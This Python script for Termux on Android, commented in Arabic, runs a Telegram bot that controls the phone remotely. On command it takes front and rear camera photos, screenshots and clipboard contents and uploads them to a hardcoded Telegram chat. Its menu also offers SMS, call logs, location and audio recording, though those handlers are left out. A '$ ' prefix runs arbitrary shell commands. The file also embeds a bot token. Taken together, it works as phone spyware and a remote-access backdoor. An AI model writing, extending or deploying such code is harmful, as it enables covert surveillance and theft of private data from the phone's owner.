import subprocess
import json
import requests
import time
import os
import threading

TOKEN = "8834957624:AAFbfeGveFu5xUgbsx7Dyh3YBHJx6cuIjKo"
MY_CHAT_ID = 1674108077
BASE_DIR = "/data/data/com.termux/files/home"

is_recording = False
recording_lock = threading.Lock()
current_recording_process = None

# ================= دالة مركزية للتعامل مع API تليجرام =================
def telegram_api(method, payload=None, files=None):
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    try:
        if files:
            response = requests.post(url, data=payload, files=files, timeout=30)
        else:
            response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"API Error: {e}")
        return None

# ================= دوال واجهة المستخدم (القوائم) =================
def send_main_menu(chat_id, text="✨ *القائمة الرئيسية جاهزة:*"):
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📱 سجل المكالمات", "callback_data": "/calls"},
                {"text": "🎙️ تسجيل صوتي", "callback_data": "/mic_menu"}
            ],
            [
                {"text": "📸 كاميرا خلفية", "callback_data": "/cam"},
                {"text": "🤳 كاميرا أمامية", "callback_data": "/cam_front"}
            ],
            [
                {"text": "📱 لقطة شاشة", "callback_data": "/screenshot"},
                {"text": "📨 رسائل SMS", "callback_data": "/sms"}
            ],
            [
                {"text": "💡 الكشاف (تشغيل/إيقاف)", "callback_data": "/torch"},
                {"text": "📋 النص المنسوخ", "callback_data": "/clipboard"}
            ],
            [
                {"text": "📶 شبكة الواي فاي", "callback_data": "/wifi"},
                {"text": "🔊 مستوى الصوت", "callback_data": "/volume"}
            ],
            [
                {"text": "📊 حالة الجهاز", "callback_data": "/status"},
                {"text": "🔋 تفاصيل البطارية", "callback_data": "/battery_info"}
            ],
            [
                {"text": "📍 الموقع الجغرافي", "callback_data": "/location"},
                {"text": "🔔 جرس إنذار (Ring)", "callback_data": "/ring"}
            ],
            [
                {"text": "🛑 إيقاف المهمة الحالية", "callback_data": "/cancel"},
                {"text": "🔄 تحديث وتنشيط", "callback_data": "/restart"}
            ]
        ]
    }
    telegram_api("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": "Markdown", "reply_markup": keyboard})

def send_message(chat_id, text):
    telegram_api("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})

# ================= وظائف النظام (Termux API) =================
def execute_termux_cmd(cmd, is_json=True):
    try:
        result = subprocess.check_output(cmd, shell=True, timeout=15)
        return json.loads(result.decode('utf-8', errors='ignore')) if is_json else result.decode('utf-8', errors='ignore')
    except Exception as e:
        return str(e)

def get_clipboard_report():
    res = execute_termux_cmd("termux-clipboard-get", is_json=False)
    return f"📋 *النص المنسوخ حالياً في الهاتف:*\n\n`{res}`" if res else "❌ الحافظة فارغة."

def toggle_torch():
    try:
        # يحاول تشغيل الكشاف، إذا فشل فهذا يعني أنه يحتاج لإيقاف
        subprocess.run("termux-torch on", shell=True, timeout=5)
        return "💡 تم تشغيل الكشاف."
    except:
        subprocess.run("termux-torch off", shell=True, timeout=5)
        return "💡 تم إيقاف الكشاف."

def play_ringtone():
    try:
        subprocess.run("termux-media-player play ringtone", shell=True)
        return "🔔 تم تشغيل نغمة الرنين في الهاتف."
    except Exception as e:
        return f"❌ خطأ: {e}"

# ... (دوال get_call_logs_report, get_device_status, get_sms_report, get_wifi_report, get_location_report تبقى كما هي من كودك السابق، لأنها ممتازة) ...
# سأضع هنا دالة واحدة كمثال للتأكيد على طريقة الاستدعاء الجديدة
def get_device_status():
    data = execute_termux_cmd("termux-battery-status")
    if isinstance(data, dict):
        percentage = data.get('percentage', 'N/A')
        st = os.statvfs(BASE_DIR)
        free_mb = (st.f_bavail * st.f_frsize) / (1024 * 1024)
        return f"📊 *حالة الجهاز الحالية:*\n🔋 نسبة البطارية: {percentage}%\n💾 المساحة المتاحة: {free_mb:.2f} MB"
    return "❌ فشل جلب الحالة."

# ================= وظائف الوسائط (صور / صوت / شاشة) =================
def take_media_task(chat_id, media_type, camera_id="0"):
    file_name = "screen.png" if media_type == "screenshot" else f"photo_{camera_id}.jpg"
    file_path = os.path.join(BASE_DIR, file_name)
    
    if os.path.exists(file_path):
        os.remove(file_path)
        
    send_message(chat_id, f"⏳ جاري معالجة الطلب ({media_type})...")
    
    try:
        if media_type == "screenshot":
            subprocess.run(f"termux-screenshot {file_path}", shell=True, check=True, timeout=15)
            method, field = "sendDocument", "document" # نرسلها كملف للحفاظ على الجودة
        else:
            subprocess.run(f"termux-camera-photo -c {camera_id} {file_path}", shell=True, check=True, timeout=15)
            method, field = "sendPhoto", "photo"

        time.sleep(1)
        
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            send_message(chat_id, "📤 يتم الآن الإرسال...")
            with open(file_path, 'rb') as file_data:
                telegram_api(method, payload={"chat_id": chat_id}, files={field: file_data})
            os.remove(file_path) # تنظيف الملف بعد الإرسال
        else:
            send_message(chat_id, "❌ فشل التقاط الصورة/الشاشة.")
            
    except Exception as e:
        send_message(chat_id, f"❌ حدث خطأ: {e}")
    finally:
        send_main_menu(chat_id)

def handle_task(chat_id, target_func):
    send_message(chat_id, target_func())
    send_main_menu(chat_id)

# ================= حلقة التشغيل الرئيسية =================
def main():
    print("🤖 البوت يعمل بانتظار الأوامر...")
    send_message(MY_CHAT_ID, "🟢 *تم الاتصال بنجاح!*\nالبوت يعمل الآن بكفاءة ومستعد لاستقبال الأوامر.")
    send_main_menu(MY_CHAT_ID)
    
    offset = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=30"
            response = requests.get(url, timeout=35).json()
            
            if response.get("ok"):
                for update in response.get("result", []):
                    offset = update["update_id"] + 1
                    chat_id, text = None, ""
                    
                    if "callback_query" in update:
                        callback = update["callback_query"]
                        chat_id = callback["message"]["chat"]["id"]
                        text = callback["data"]
                        telegram_api("answerCallbackQuery", {"callback_query_id": callback["id"]})
                    elif "message" in update:
                        chat_id = update["message"].get("chat", {}).get("id")
                        text = update["message"].get("text", "").strip()
                    
                    if chat_id == MY_CHAT_ID:
                        # إضافة ميزة تنفيذ أوامر Shell المباشرة
                        if text.startswith("$ "):
                            cmd = text[2:]
                            send_message(chat_id, "⚙️ جاري التنفيذ...")
                            res = execute_termux_cmd(cmd, is_json=False)
                            send_message(chat_id, f"🖥️ *النتيجة:*\n```\n{res}\n```")
                            
                        elif text == "/torch":
                            threading.Thread(target=handle_task, args=(chat_id, toggle_torch)).start()
                        elif text == "/clipboard":
                            threading.Thread(target=handle_task, args=(chat_id, get_clipboard_report)).start()
                        elif text == "/ring":
                            threading.Thread(target=handle_task, args=(chat_id, play_ringtone)).start()
                        elif text == "/cam":
                            threading.Thread(target=take_media_task, args=(chat_id, "photo", "0")).start()
                        elif text == "/cam_front":
                            threading.Thread(target=take_media_task, args=(chat_id, "photo", "1")).start()
                        elif text == "/screenshot":
                            threading.Thread(target=take_media_task, args=(chat_id, "screenshot")).start()
                        # ... يمكنك إضافة باقي شروط (if/elif) الخاصة بالمكالمات والصوت بنفس طريقتك السابقة
                        elif text in ["/start", "/restart"]:
                            send_main_menu(chat_id)
                            
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()
